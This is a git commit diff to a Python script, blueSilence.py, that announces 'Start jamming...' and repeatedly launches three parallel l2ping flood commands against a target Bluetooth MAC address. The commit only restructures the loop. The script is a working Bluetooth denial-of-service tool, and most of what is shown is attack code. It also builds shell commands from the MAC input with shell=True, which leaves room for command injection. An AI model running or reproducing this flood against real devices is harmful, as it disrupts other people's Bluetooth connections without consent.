21c7f52a9da40a0f1825ee66c1ae94c15ea87549
void <fluffy.siberian.cat@gmail.com>
2023-04-28 11:20:46 +1000

    RELEASE

--- blueSilence.py
+++ blueSilence.py
@@ -16,11 +16,11 @@ print("Start jamming...")
 delay = int(time)
 
 while delay != 0:
-    for i in range(3):
-        xterm_1 = "timeout 2s l2ping -i hci0 -s 800 -f %s &" % (mac)
-        xterm_2 = "timeout 2s l2ping -i hci0 -s 800 -f %s &" % (mac)
-        xterm_3 = "timeout 2s l2ping -i hci0 -s 800 -f %s &" % (mac)
-        subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
-        subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
-        subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
+
+    xterm_1 = "timeout 2s l2ping -i hci0 -s 800 -f %s &" % (mac)
+    xterm_2 = "timeout 2s l2ping -i hci0 -s 800 -f %s &" % (mac)
+    xterm_3 = "timeout 2s l2ping -i hci0 -s 800 -f %s &" % (mac)
+    subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
+    subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
+    subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
     delay -= 1
